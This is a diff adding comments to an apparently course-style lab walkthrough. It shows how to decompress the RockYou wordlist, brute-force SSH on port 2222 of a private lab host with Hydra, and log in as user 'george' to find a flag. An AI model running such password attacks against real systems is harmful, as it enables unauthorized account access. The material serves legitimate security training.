@@ -38,10 +38,13 @@ Unzipping Gzip Archive and attacking SSH
 
 Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on Password Attacks - SSH - VM #1. Find the flag in the george user's home directory.
 >``` shell
+># Navigate to the default wordlists directory
 >kali@kali:~$ cd /usr/share/wordlists/
 >
+># Decompress the RockYou wordlist (required before use)
 >kali@kali:~$ sudo gzip -d rockyou.txt.gz
 >
+>Run Hydra to perform a dictionary attack against SSH on port 2222
 >kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.123.201
 >
 ># ========== Expected Result ==========
@@ -50,12 +53,14 @@ Lab 1 - Follow the steps outlined in this section to leverage a dictionary attac
 >...
 ># =====================================
 >
+># Log in to the target via SSH using the discovered credentials
 >kali@kali:~$ ssh george@192.168.123.201 -p 2222
 >
 ># ========== Expected Result ==========
 >george@83fe940bd7cf:~$ 
 ># =====================================
 >
+># Locate the flag
 >george@83fe940bd7cf:~$ pwd
 >
 ># ========== Expected Result ==========
